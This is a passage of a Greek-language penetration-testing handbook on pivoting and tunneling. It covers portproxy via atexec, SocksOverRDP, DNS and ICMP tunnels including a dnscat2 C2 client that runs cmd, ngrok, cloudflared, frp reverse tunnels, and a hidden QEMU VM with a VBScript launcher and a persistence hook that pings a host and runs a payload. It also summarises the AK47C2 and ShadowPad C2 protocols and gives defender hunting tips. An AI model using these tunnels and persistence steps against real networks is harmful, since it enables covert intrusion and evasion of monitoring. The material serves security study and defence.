Όταν είναι διαθέσιμα διαπιστευτήρια διαχειριστή, η απομακρυσμένη εκτέλεση του Task Scheduler μπορεί να εγκαταστήσει έναν εγγενή κανόνα προώθησης χωρίς να γίνει upload ειδικού relay. Για παράδειγμα, το [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) μπορεί να κάνει ένα pivot να ακούει στη θύρα TCP/443 και να προωθεί τη σύνδεση σε μια εσωτερική υπηρεσία SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Ο κανόνας είναι μόνιμος, επομένως απαριθμήστε τον με `netsh interface portproxy show v4tov4` και αφαιρέστε τον ρητά μετά τις δοκιμές. Να θυμάστε ότι το `portproxy` παρέχει μόνο προώθηση· το firewall του host πρέπει επίσης να επιτρέπει τη θύρα ακρόασης.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Πρέπει να έχετε **πρόσβαση RDP στο σύστημα**.\
Κατεβάστε:

Το SocksOverRDP χρησιμοποιεί Remote Desktop Dynamic Virtual Channels για τη μεταφορά μιας σύνδεσης SOCKS5 μέσω μιας υπάρχουσας συνεδρίας RDP· το plugin του client ακούει στη διεύθυνση `127.0.0.1:1080`, ενώ το στοιχείο server εκτελείται στον στόχο RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη λειτουργία Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **τη διοχέτευση πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον υπολογιστή-πελάτη σας, φορτώστε το **`SocksOverRDP-Plugin.dll`** ως εξής:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Τώρα μπορούμε να **συνδεθούμε** στο **θύμα** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`** και θα πρέπει να εμφανιστεί ένα **μήνυμα** που λέει ότι το plugin **SocksOverRDP** είναι ενεργοποιημένο και ότι θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε και εκτελέστε στο μηχάνημα του θύματος το binary `SocksOverRDP-Server.exe`:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Τώρα, επιβεβαίωσε στο μηχάνημά σου (attacker) ότι η θύρα 1080 βρίσκεται σε κατάσταση ακρόασης:

```
netstat -antb | findstr 1080
```

Τώρα μπορείτε να χρησιμοποιήσετε το [**Proxifier**](https://www.proxifier.com/) για να περάσετε την κίνηση μέσω proxy από αυτήν τη θύρα.<sup>[[26]](#references)</sup>

### Αναζήτηση σε RDP virtual channel

Το [`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) είναι ένα ακόμη tunnel μέσω RDP virtual channel· το προεπιλεγμένο όνομα channel είναι `rdp2tcp`, αν και ο operator μπορεί να επιλέξει διαφορετικό όνομα.<sup>[[56]](#references)</sup> Η δημιουργία και το κλείσιμο channel καταγράφονται στο `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` με event IDs **132** και **148**. Αναζητήστε το `rdp2tcp` και σπάνια/τυχαία ονόματα channel και, στη συνέχεια, συγκρίνετέ τα με αναμενόμενα channel, όπως τα `XPSRD`, `cliprdr` και `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Χρήση proxy σε Windows GUI Apps

Μπορείτε να ρυθμίσετε Windows GUI apps ώστε να περιηγούνται μέσω proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Στο **Profile -> Proxy Servers**, προσθέστε την IP και τη θύρα του SOCKS server.\
Στο **Profile -> Proxification Rules**, προσθέστε το όνομα του προγράμματος για το οποίο θέλετε να χρησιμοποιήσετε proxy και τις συνδέσεις προς τις IP που θέλετε να περάσουν μέσω proxy· οι κανόνες του Proxifier μπορούν να αντιστοιχούν σε εφαρμογές, hosts προορισμού και θύρες.<sup>[[27]](#references)</sup>

## Tunneling μέσω NTLM proxy

Το εργαλείο **Rpivot** που αναφέρθηκε προηγουμένως μπορεί να κάνει relay μέσω proxy που απαιτεί NTLM authentication. Το **OpenVPN** μπορεί επίσης να δρομολογήσει την κίνηση μέσω τέτοιου proxy, όταν έχει ρυθμιστεί με auth file και τη μέθοδο NTLMv2· πρόκειται για διέλευση μέσω proxy και όχι για παράκαμψη του proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Το Cntlm κάνει authentication σε upstream NTLM proxies, εκθέτει local listeners και μπορεί να αντιστοιχίσει μια local tunnel port σε μια destination service· στη συνέχεια, οι clients μπορούν να χρησιμοποιήσουν αυτήν την local port.<sup>[[29]](#references)</sup>\
Για παράδειγμα, προωθεί τη θύρα 443.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Τώρα, αν ρυθμίσεις, για παράδειγμα, την υπηρεσία **SSH** στο θύμα να ακούει στη θύρα 443, μπορείς να συνδεθείς σε αυτή μέσω της θύρας 2222 του attacker.<sup>[[29]](#references)</sup>\
Μπορείς επίσης να χρησιμοποιήσεις ένα **meterpreter** που συνδέεται στο localhost:443, ενώ ο attacker ακούει στη θύρα 2222.<sup>[[29]](#references)</sup>

## YARP

Το YARP (Yet Another Reverse Proxy) είναι το toolkit της Microsoft για reverse proxy σε .NET. Μπορείς να το βρεις εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Το Iodine δημιουργεί ένα IPv4 tunnel μέσω DNS queries και χρησιμοποιεί διεπαφές TUN· η τεκμηριωμένη ρύθμιση απαιτεί τα απαραίτητα προνόμια για τη δημιουργία αυτών των διεπαφών και στα δύο άκρα.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Το DNS transport έχει μεγαλύτερο overhead από το απευθείας TCP και είναι συνήθως αργό· μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του tunnel χρησιμοποιώντας:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

Το Dnscat2 δημιουργεί ένα κρυπτογραφημένο κανάλι command-and-control μέσω DNS· οι παρακάτω εντολές του server και του client ακολουθούν την τεκμηριωμένη χρήση του.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

Μπορείτε να χρησιμοποιήσετε το [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν dnscat2 client στο PowerShell· το README του περιγράφει τις παραμέτρους του `Start-Dnscat2` που εμφανίζονται παρακάτω.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding με dnscat**

Η διαδραστική εντολή `listen` του dnscat2 αντιστοιχίζει έναν τοπικό listener σε έναν απομακρυσμένο host και port.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Αλλαγή του DNS στο proxychains

Το Proxychains-ng κάνει hooks στις δυναμικά συνδεδεμένες συνδέσεις TCP και δεν μπορεί να μεταφέρει UDP ή ICMP. Η προώθηση DNS μπορεί να ρυθμιστεί, γι’ αυτό ελέγξτε το εγκατεστημένο `proxychains.conf` και το βοηθητικό πρόγραμμα resolver, αντί να θεωρείτε δεδομένο ότι χρησιμοποιείται ένας συγκεκριμένος δημόσιος resolver. Τα παλαιότερα scripts `proxyresolv` παρέχουν τη μεταβλητή `PROXY_DNS_SERVER` για την επιλογή του resolver· χρησιμοποιήστε έναν resolver που είναι προσβάσιμος από το pivot όταν χρειάζεστε εσωτερικά ονόματα.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Ο actor Storm-2603 δημιούργησε ένα **C2 διπλού καναλιού ("AK47C2")** που καταχράται *μόνο* εξερχόμενη κίνηση **DNS** και **plain HTTP POST** — δύο πρωτόκολλα που σπάνια αποκλείονται σε εταιρικά δίκτυα.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
   • Δημιουργεί ένα τυχαίο SessionID 5 χαρακτήρων (π.χ. `H4T14`).  
   • Προσθέτει το `1` για *αιτήματα εργασιών* ή το `2` για *αποτελέσματα* και συνενώνει διαφορετικά πεδία (flags, SessionID, όνομα υπολογιστή).  
   • Κάθε πεδίο **κρυπτογραφείται με XOR χρησιμοποιώντας το ASCII key `VHBD@H`**, κωδικοποιείται σε hex και συνενώνεται με τελείες — με το domain που ελέγχει ο attacker στο τέλος:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Τα requests χρησιμοποιούν `DnsQuery()` για εγγραφές **TXT** (και ως εναλλακτική, **MG**).  
   • Όταν η απόκριση υπερβαίνει τα 0xFF bytes, το backdoor **κατακερματίζει** τα δεδομένα σε κομμάτια των 63 bytes και εισάγει τους δείκτες:
     `s<SessionID>t<TOTAL>p<POS>` ώστε ο C2 server να μπορεί να τα αναδιατάξει.

2. **HTTP mode (AK47HTTP)**
   • Δημιουργεί ένα JSON envelope:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Ολόκληρο το blob γίνεται XOR με `VHBD@H` → hex → αποστέλλεται ως body ενός **`POST /`** με header `Content-Type: text/plain`.
   • Η απάντηση ακολουθεί την ίδια κωδικοποίηση και εκτελείται το πεδίο `cmd` με `cmd.exe /c <command> 2>&1`.

Σημειώσεις Blue Team
• Αναζητήστε ασυνήθιστα **TXT queries**, των οποίων το πρώτο label είναι μεγάλο hexadecimal και καταλήγουν πάντα σε ένα σπάνιο domain.
• Ένα σταθερό XOR key ακολουθούμενο από ASCII-hex εντοπίζεται εύκολα με YARA: `6?56484244?484` (`VHBD@H` σε hex).
• Για HTTP, επισημάνετε bodies από αιτήματα POST με `text/plain` που αποτελούνται αποκλειστικά από hex και έχουν άρτιο αριθμό bytes.

{{#note}}
Το κανάλι διατηρεί κάθε sub-domain label εντός του ορίου DNS των 63 octets, αλλά η συμμόρφωση με το πρωτόκολλο δεν το καθιστά από μόνη της stealthy· τα σπάνια domains, τα μεγάλα hexadecimal labels και ο όγκος των queries παραμένουν ενδείξεις για εντοπισμό.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Το Hans τεκμηριώνει ένα tunnel IPv4-over-ICMP που χρησιμοποιεί συσκευή TUN και αιτήματα ICMP echo· η ρύθμιση απαιτεί επαρκή δικαιώματα για τη δημιουργία της διεπαφής.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).

Το ptunnel-ng μεταφέρει συνδέσεις TCP μέσω ICMP και χρησιμοποιεί τις επιλογές `-p`, `-l`, `-r` και `-R` που εμφανίζονται παρακάτω για το proxy, τον τοπικό listener, τον host προορισμού και τη θύρα προορισμού.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

Το [**ngrok**](https://ngrok.com/) είναι ένας agent που καθιστά διαθέσιμες στο διαδίκτυο τοπικές υπηρεσίες δικτύου μέσω ασφαλούς tunnel· το CLI του τεκμηριώνει endpoints HTTP, TCP και URL αρχείων, ενώ το hostname του endpoint που εμφανίζεται μπορεί να διαφέρει ανάλογα με το endpoint και τον λογαριασμό.<sup>[[39]](#references)</sup>

### Εγκατάσταση

- Δημιουργήστε λογαριασμό: https://ngrok.com/signup
- Λήψη client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Ο agent υποστηρίζει επίσης επιλογές authentication και TLS, όταν χρειάζεται.<sup>[[39]](#references)</sup>_

#### Δημιουργία TCP tunnel

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Έκθεση αρχείων μέσω HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP κλήσεων

_Χρήσιμο για XSS,SSRF,SSTI ..._\
Ο standalone agent εκθέτει το interface επιθεώρησης HTTP στη διεύθυνση `http://127.0.0.1:4040` από προεπιλογή· το interface προορίζεται για HTTP traffic.<sup>[[40]](#references)</sup>

#### Tunneling εσωτερικής HTTP υπηρεσίας

Η επιλογή `--host-header=rewrite` ξαναγράφει το upstream HTTP `Host` header ώστε να αντιστοιχεί στην τοπική υπηρεσία.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### απλό παράδειγμα διαμόρφωσης ngrok.yaml

Αυτό χρησιμοποιεί το ngrok Agent Config v2· τα named tunnels χρησιμοποιούν `proto` και `addr` και ξεκινούν με `ngrok start`.<sup>[[42]](#references)</sup> Ανοίγει 3 tunnels:

- 2 TCP
- 1 HTTP με έκθεση στατικών αρχείων από το /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Το Microsoft Dev Tunnels μπορεί να δημοσιεύσει μια τοπική υπηρεσία που βασίζεται σε TCP μέσω της υποδομής relay της Microsoft. Το CLI του host δημιουργεί ένα εξερχόμενο tunnel, ενώ η εντολή `devtunnel connect` αναδημιουργεί την εκτεθειμένη θύρα στον client· τα tunnels απαιτούν από προεπιλογή authentication, εκτός αν χαλαρώσουν σκόπιμα οι έλεγχοι πρόσβασης.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Αυτό μπορεί να εκθέσει το RDP μέσω του `*.devtunnels.ms` χωρίς να ανοίξει νέο εισερχόμενο listener στην περίμετρο. Μπορεί επίσης να συνδυαστεί με ένα RDP virtual-channel tunnel, όπως το `rdp2tcp`, μετατρέποντας τη συνεδρία RDP σε pivot δεύτερου σταδίου για αυθαίρετη κίνηση TCP.<sup>[[58]](#references)</sup>

Για threat hunting, συσχετίστε την εκτέλεση του Dev Tunnels CLI με κίνηση DNS/TLS προς το `*.devtunnels.ms` και μη αναμενόμενα συμβάντα RDP virtual-channel. Ένα authenticated tunnel δεν είναι ακίνδυνο μόνο και μόνο επειδή χρησιμοποιεί relay ιδιοκτησίας της Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Ο connector `cloudflared` του Cloudflare Tunnel δημιουργεί εξερχόμενες συνδέσεις· οι δημοσιευμένες εφαρμογές μπορούν να δρομολογούν HTTP, HTTPS, TCP, SSH και RDP, ενώ τα quick tunnels προορίζονται για ανάπτυξη HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### One-liner για quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Προέλευση SOCKS5 (παρωχημένη λειτουργία)

Η παρωχημένη σημαία `--socks5` ενημερώνει το `cloudflared` ότι η τοπική προέλευση χρησιμοποιεί SOCKS5· δεν δημιουργεί τοπικό listener SOCKS5. Για ένα managed tunnel, το `originRequest.proxyType: socks` ρυθμίζει τον χειρισμό προέλευσης SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Μόνιμα tunnels με DNS

Η τοπικά διαχειριζόμενη διαμόρφωση tunnel χρησιμοποιεί κλειδιά με πεζά γράμματα `tunnel`, `credentials-file` και `url`, όπως φαίνεται παρακάτω.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Εκκινήστε τον connector:

```bash
cloudflared tunnel run mytunnel
```

Ο connector δημιουργεί εξερχόμενες συνδέσεις και, από προεπιλογή, διαπραγματεύεται QUIC με εναλλακτική λύση το HTTP/2· μην υποθέτετε ότι κάθε deployment χρησιμοποιεί TCP/443. Εκτελέστε τον μόνο με τα δικαιώματα που απαιτούνται από το deployment σας.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

Το [`frp`](https://github.com/fatedier/frp) είναι ένα reverse proxy γραμμένο σε Go που υποστηρίζει **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX και XTCP**. Το XTCP χρησιμοποιεί P2P hole punching, η επιτυχία του οποίου εξαρτάται από το NAT. Από την έκδοση **v0.53.0**, μπορεί να λειτουργεί ως **SSH Tunnel Gateway**, ώστε ένας host-στόχος να μπορεί να χρησιμοποιεί τον τυπικό OpenSSH client χωρίς binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Χρήση του νέου SSH gateway (χωρίς δυαδικό αρχείο frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Η παραπάνω εντολή δημοσιεύει τη θύρα **8080** του θύματος ως **attacker_ip:9000**, χρησιμοποιώντας τον τυπικό client του OpenSSH, ενώ το `frps` παρέχει την πύλη.<sup>[[50]](#references)</sup>

## UDP back-connects με υποβοήθηση STUN

Τα STUN Binding requests που αποστέλλονται από ένα UDP socket μπορούν να αποκαλύψουν τη server-reflexive διεύθυνση IP και τη θύρα του, ενώ η περιοδική κίνηση διατηρεί ενεργή τη σύνδεση NAT. Ένας δημόσιος STUN server δεν λειτουργεί ως relay για αυθαίρετα control packets.<sup>[[60]](#references)</sup> Ένας back-connect σχεδιασμός που αναλύθηκε διατηρούσε το ίδιο UDP socket για ένα σύντομο control datagram και, στη συνέχεια, χρησιμοποιούσε *ξεχωριστή εξερχόμενη σύνδεση TCP* για τη λήψη και την εκτέλεση εντολών μετά τη λήψη του trigger.<sup>[[59]](#references)</sup>

Για να λάβει το UDP packet του controller, ένας σχεδιασμός πρέπει και πάλι να κοινοποιεί το mapping στον controller και να συμμορφώνεται με την πολιτική φιλτραρίσματος του NAT. Το φιλτράρισμα με βάση τη διεύθυνση ή τη θύρα μπορεί να δέχεται απαντήσεις από τον STUN server, αλλά να απορρίπτει packets από άλλο endpoint.<sup>[[60]](#references)[[61]](#references)</sup> Η διαδρομή rendezvous του backdoor που αναλύθηκε δεν επαληθεύτηκε, επομένως οι επιτυχημένες απαντήσεις STUN από μόνες τους δεν αποδεικνύουν ότι το control channel είναι προσβάσιμο.<sup>[[59]](#references)</sup> Για ξεχωριστό πρωτόκολλο με ρητό rendezvous και εναλλακτική χρήση relay, δείτε το [NAT traversal καμερών PPPP](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Covert tunnels βασισμένα σε VM με QEMU

Το user-mode networking του QEMU δεν απαιτεί δικαιώματα root ή διαχειριστή για το virtual network, ενώ το `-netdev user,hostfwd=...` ανακατευθύνει συνδέσεις TCP, UDP ή UNIX από τον host στο guest.<sup>[[51]](#references)</sup> Η TrustedSec τεκμηρίωσε ένα Tiny Core QEMU VM και μια απόπειρα reverse SSH tunnel σε περιστατικό όπου ένα EDR που εστιάζει στον host θα μπορούσε να μην εντοπίσει δραστηριότητα μέσα στο guest.<sup>[[1]](#references)</sup>

### Γρήγορη εντολή μίας γραμμής

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Η παραπάνω εντολή εκκινεί ένα guest **Tiny Core Linux** με 256 MiB μνήμης και έναν δίσκο qcow2· το image δίσκου δεν είναι δίσκος στη RAM.  
• Η θύρα **2222/tcp** στον host των Windows προωθείται διαφανώς στη **22/tcp** μέσα στο guest.  
• Από την οπτική γωνία του attacker, ο στόχος απλώς εκθέτει τη θύρα 2222· τα πακέτα που φτάνουν σε αυτήν τα χειρίζεται ο SSH server που εκτελείται στο VM.

### Αθόρυβη εκκίνηση μέσω VBScript

Η TrustedSec παρατήρησε εκκινήσεις QEMU μέσω VBS και images Tiny Core στο περιστατικό που αναφέρεται παραπάνω.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Η εκτέλεση του script με `cscript.exe //B update.vbs` διατηρεί το παράθυρο κρυφό.<sup>[[1]](#references)</sup>

### Persistence εντός του guest

Το περιστατικό που αναφέρεται περιγράφει persistence στο stateless Tiny Core guest μέσω των `/opt/bootlocal.sh` και `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Τοποθετήστε το payload στο `/opt/123.out`  
2. Προσθέστε στο τέλος του `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Προσθέστε τα `home/tc` και `opt` στο `/opt/filetool.lst`, ώστε το payload να συμπεριληφθεί στο `mydata.tgz` κατά τον τερματισμό.

### Ζητήματα τηλεμετρίας

• Ο host εξακολουθεί να εκθέτει τη διεργασία QEMU, την εικόνα qcow2 και τυχόν listener που έχει προωθηθεί από τον host.  
• Οι σαρώσεις διεργασιών που περιορίζονται στον host ενδέχεται να μην εξετάζουν τις διεργασίες του guest, αλλά η εικονικοποίηση δεν εγγυάται την αποφυγή εντοπισμού· η τηλεμετρία δικτύου, QEMU και εικόνων μπορεί και πάλι να το αποκαλύψει.<sup>[[1]](#references)[[51]](#references)</sup>

### Συμβουλές για Defender

• Δημιουργήστε ειδοποίηση για **απρόσμενα δυαδικά αρχεία QEMU/VirtualBox/KVM** σε διαδρομές όπου έχουν δυνατότητα εγγραφής οι χρήστες.  
• Αποκλείστε εξερχόμενες συνδέσεις που προέρχονται από το `qemu-system*.exe`.  
• Αναζητήστε ασυνήθιστες θύρες ακρόασης (2222, 10022, …) που αρχίζουν να δέχονται συνδέσεις αμέσως μετά την εκκίνηση του QEMU.

## Κόμβοι relay IIS/HTTP.sys μέσω `HttpAddUrl` (ShadowPad)

Η Check Point περιγράφει τη μονάδα IIS του ShadowPad ως μηχανισμό που μετατρέπει παραβιασμένους περιμετρικούς web servers σε backdoor και κόμβους relay, δεσμεύοντας προθέματα URL μέσω του `HttpAddUrl`.<sup>[[3]](#references)</sup>

Η ίδια αναφορά περιγράφει τις προεπιλεγμένες ρυθμίσεις, τους listeners wildcard, την αποκρυπτογράφηση πακέτων, τις ουρές relay και την τηλεμετρία αποσφαλμάτωσης που συνοψίζονται παρακάτω.<sup>[[3]](#references)</sup>

* **Προεπιλεγμένες ρυθμίσεις** – αν το JSON config της μονάδας δεν περιέχει τιμές, χρησιμοποιούνται εύλογες προεπιλεγμένες ρυθμίσεις IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Έτσι, η IIS απαντά στην κανονική κίνηση με τη σωστή επωνυμία.
* **Παρεμβολή wildcard** – οι χειριστές παρέχουν μια λίστα προθεμάτων URL, διαχωρισμένων με ελληνικό ερωτηματικό (wildcards σε host και path). Η μονάδα καλεί το `HttpAddUrl` για κάθε καταχώριση, οπότε το HTTP.sys δρομολογεί τα αιτήματα που αντιστοιχούν στον κακόβουλο χειριστή· τα αιτήματα που δεν αντιστοιχούν ακολουθούν την κανονική συμπεριφορά της IIS.
* **Κρυπτογραφημένο πρώτο πακέτο** – τα δύο πρώτα byte του σώματος του αιτήματος περιέχουν το seed για έναν προσαρμοσμένο PRNG 32-bit. Κάθε επόμενο byte γίνεται XOR με την παραγόμενη keystream πριν από την ανάλυση του πρωτοκόλλου:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Ενορχήστρωση relay** – το module διατηρεί δύο λίστες: «διακομιστές» (upstream κόμβοι) και «clients» (downstream implants). Οι καταχωρίσεις αφαιρούνται αν δεν ληφθεί heartbeat εντός περίπου 30 δευτερολέπτων. Όταν και οι δύο λίστες δεν είναι κενές, αντιστοιχίζει τον πρώτο υγιή διακομιστή με τον πρώτο υγιή client και απλώς προωθεί τα bytes μεταξύ των sockets τους μέχρι να κλείσει η σύνδεση από τη μία πλευρά.
* **Τηλεμετρία αποσφαλμάτωσης** – η προαιρετική καταγραφή αποθηκεύει τη διεύθυνση IP προέλευσης, τη διεύθυνση IP προορισμού και τα συνολικά bytes που προωθήθηκαν για κάθε αντιστοίχιση. Οι ερευνητές χρησιμοποίησαν αυτά τα ίχνη για να ανασυνθέσουν το ShadowPad mesh που εκτεινόταν σε πολλαπλά θύματα.

---

## Άλλα εργαλεία προς έλεγχο

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Κρυμμένοι στις σκιές: Covert tunnels μέσω εικονικοποίησης QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το relay network και τον εσωτερικό μηχανισμό μιας συγκαλυμμένης επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README του Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Οδηγός αναφοράς του Nmap: Παράκαμψη περιορισμών Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
